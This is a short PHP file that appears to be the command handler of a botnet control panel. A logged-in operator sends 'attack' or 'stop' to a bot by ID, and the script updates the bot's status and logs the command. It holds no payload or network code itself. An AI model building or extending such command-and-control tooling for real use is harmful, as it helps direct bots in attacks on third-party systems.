<?php
session_start();
require_once 'functions.php';

if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit();
}

if (isset($_POST['bot_id'], $_POST['command'])) {
    $bot_id = $_POST['bot_id'];
    $command = $_POST['command'];
    
    // Process the command and update bot status
    if ($command === 'attack') {
        updateBotStatus($bot_id, 'attacking', 'Attack initiated');
        $result = "Attack started!";
    } elseif ($command === 'stop') {
        updateBotStatus($bot_id, 'inactive', 'Attack stopped');
        $result = "Attack stopped!";
    } else {
        $result = "Invalid command!";
    }

    // Log the command
    logCommand($bot_id, $command, $result);
    
    // Redirect back to control panel
    header('Location: control_panel.php');
    exit();
}
?>
